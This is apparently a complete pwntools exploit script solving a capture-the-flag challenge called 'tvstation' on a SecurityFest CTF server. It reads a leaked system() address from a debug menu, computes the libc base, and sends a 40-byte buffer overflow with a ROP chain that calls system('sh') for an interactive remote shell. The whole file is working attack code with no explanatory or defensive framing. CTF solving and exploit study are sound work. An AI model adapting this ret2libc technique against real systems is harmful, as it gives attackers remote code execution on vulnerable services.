#!/usr/bin/env python

from pwn import *

"""
# local
r = process('./tvstation' )
libc = ELF('/lib/x86_64-linux-gnu/libc-2.19.so')
"""

# remote
r = remote('pwn2.securityfest.ctf.rocks', '3000')
libc = ELF('./libc-2.19.so')

r.recvuntil('Choice: ')
r.sendline('4')
r.recvuntil('[Debug menu] system is @0x')

system_leak = int(r.recvline(), 16)
r.recvuntil('cmd: ')

libc.address = system_leak - libc.symbols['system']
pop_rdi_ret_address = 0x0000000000400c13

print "[+] libc base address: " + hex(libc.address)

shellcode = "A" * 40
shellcode += p64(pop_rdi_ret_address)
shellcode += p64(next(libc.search('sh\x00')))
shellcode += p64(libc.symbols['system'])

r.sendline(shellcode)
r.interactive()
